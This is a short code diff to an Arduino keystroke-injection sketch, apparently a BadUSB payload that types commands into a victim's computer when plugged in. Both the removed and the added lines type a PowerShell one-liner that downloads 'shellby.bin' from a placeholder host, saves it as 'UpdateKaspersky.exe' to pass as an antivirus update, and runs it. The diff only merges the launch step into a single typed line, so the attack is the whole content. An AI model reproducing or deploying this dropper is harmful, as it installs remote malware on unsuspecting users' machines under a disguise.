@@ -10,13 +10,7 @@ void setup() {
   Keyboard.releaseAll();
   delay(400);
 
-   Keyboard.print("powershell");
-  Keyboard.press(KEY_RETURN);
-  delay(10);
-  Keyboard.releaseAll();
-  delay(500);
- 
-  Keyboard.print("$down = New-Object System.Net.WebClient; $url = 'http://xxx.xxx.xxx/shellby.bin'; $file = 'UpdateKaspersky.exe'; $down.DownloadFile($url,$file); $exec = New-Object -com shell.application; $exec.shellexecute($file); exit;");
+   Keyboard.print("powershell $down = New-Object System.Net.WebClient; $url = 'http://xxx.xxx.xxx/shellby.bin'; $file = 'UpdateKaspersky.exe'; $down.DownloadFile($url,$file); $exec = New-Object -com shell.application; $exec.shellexecute($file); exit;");
   Keyboard.press(KEY_RETURN);
   delay(10);
   Keyboard.releaseAll();
